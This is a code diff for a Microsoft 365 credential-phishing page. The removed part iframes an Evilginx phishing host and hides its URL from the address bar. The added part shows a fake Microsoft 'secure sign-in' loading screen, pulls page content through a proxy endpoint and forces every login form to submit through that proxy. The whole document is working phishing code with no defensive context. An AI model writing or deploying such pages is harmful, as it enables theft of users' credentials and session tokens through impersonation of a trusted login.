@@ -1,17 +1,25 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Microsoft 365 Login</title>
-    <style>
-        body, html { margin: 0; padding: 0; height: 100%; }
-        iframe { border: none; width: 100%; height: 100%; }
-    </style>
-</head>
-<body>
-    <iframe src="https://login.espeharete.top/xVpSXLob"></iframe>
-    <script>
-        // Hide Evilginx URL from address bar
-        history.replaceState({}, '', '/');
-    </script>
-</body>
-</html>
+<script>
+async function loadPage() {
+  const response = await fetch('/api/proxy');
+  const html = await response.text();
+  
+  // Nuclear option: Full page rewrite
+  document.open();
+  document.write(html);
+  document.close();
+  
+  // Reattach form handlers (critical!)
+  document.querySelectorAll('form').forEach(form => {
+    form.action = '/api/proxy'; // Force submissions through proxy
+  });
+}
+
+// Start with loading screen
+document.body.innerHTML = `
+  <div style="text-align:center;margin-top:100px">
+    <img src="https://www.microsoft.com/favicon.ico" width=50>
+    <p>Loading your secure sign-in experience...</p>
+  </div>
+`;
+setTimeout(loadPage, 1000);
+</script>
